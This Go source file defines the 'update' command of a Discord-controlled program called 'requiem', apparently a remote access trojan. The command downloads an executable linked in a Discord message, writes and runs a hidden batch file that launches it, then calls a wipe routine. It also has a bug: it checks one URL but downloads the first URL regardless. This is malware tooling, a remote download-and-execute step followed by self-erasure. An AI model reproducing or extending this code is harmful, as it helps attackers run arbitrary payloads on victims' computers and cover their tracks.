package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"requiem/funcs"
	"requiem/utils"
	"requiem/utils/discord"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
)

func (*UpdateCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	urls := discord.GetUrls(msg)
	if len(urls) == 0 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to find any urls.", msg.Reference())
		return
	}

	theUrl := ""

	for _, url := range urls {
		ext := filepath.Ext(strings.Split(url, "?")[0])
		if ext != ".exe" {
			continue
		}

		theUrl = url
		break
	}

	if theUrl == "" {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to find any executable files.", msg.Reference())
		return
	}

	path, err := utils.DownloadFile(urls[0], "")
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to download - %s", err), msg.Reference())
		return
	}

	var update strings.Builder
	update.WriteString("@echo off\n")
	update.WriteString("timeout /t 5 /nobreak > nul\n")
	fmt.Fprintf(&update, "start \"\" \"%s\"\n", path)

	name := fmt.Sprintf("%d.bat", time.Now().UnixNano())
	path = filepath.Join(os.TempDir(), name)

	err = os.WriteFile(path, []byte(update.String()), 0666)
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to write file - %s", err), msg.Reference())
		return
	}

	ses.ChannelMessageSendReply(msg.ChannelID, "Updating...", msg.Reference())

	cmd := utils.StartCommand("cmd", "/c", path)
	cmd.Start()

	funcs.Wipe(false)
}

func (*UpdateCommand) Name() string {
	return "update"
}

func (*UpdateCommand) Info() string {
	return "Updates requiem."
}

type UpdateCommand struct{}
